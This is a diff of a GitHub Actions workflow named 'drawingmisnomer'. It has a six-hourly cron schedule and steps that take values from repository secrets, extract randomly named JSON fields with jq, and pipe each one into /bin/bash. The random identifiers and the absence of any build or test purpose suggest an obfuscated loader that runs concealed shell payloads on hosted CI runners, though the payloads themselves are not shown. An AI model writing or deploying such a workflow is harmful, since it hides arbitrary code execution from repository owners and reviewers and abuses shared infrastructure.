@@ -1,28 +1,25 @@
 name: drawingmisnomer
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '12 0/6 * * *'
-
+    - cron: '0 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: drawingmisnomer
         env:
-          j04455: ${{ secrets.j04455 }}
+          qma431: ${{ secrets.qma431 }}
         run: |
-          echo $j04455 | jq -r .bwjd794 | /bin/bash
-          echo $uz0 | jq -r .zmyc80 | /bin/bash
-          echo $wthck10 | jq -r .qegk3 | /bin/bash
-          echo $kfmrw901 | jq -r .o30 | /bin/bash
-          echo $fnw738 | jq -r .rkuk97 | /bin/bash
-          echo $gpjxj20224 | jq -r .lckh42542 | /bin/bash
-          echo $vozdz5274 | jq -r .jh655 | /bin/bash
-          echo $lg251 | jq -r .ap14 | /bin/bash
-          echo $vq1 | jq -r .cqzb06224 | /bin/bash
-          echo $xtrzz16 | jq -r .udmt3010 | /bin/bash
+          echo $qma431 | jq -r .onl473 | /bin/bash
+          echo $jcs995 | jq -r .z78 | /bin/bash
+          echo $kbo48312 | jq -r .yjmh661 | /bin/bash
+          echo $lxhre8940 | jq -r .d79 | /bin/bash
+          echo $ase9865 | jq -r .wo1 | /bin/bash
+          echo $qrxrr24 | jq -r .pekyh68 | /bin/bash
+          echo $tnsth8 | jq -r .oqk9694 | /bin/bash
+          echo $kru26 | jq -r .w852 | /bin/bash
+          echo $r3 | jq -r .kbong4 | /bin/bash
+          echo $eldm30 | jq -r .vv7987 | /bin/bash
 
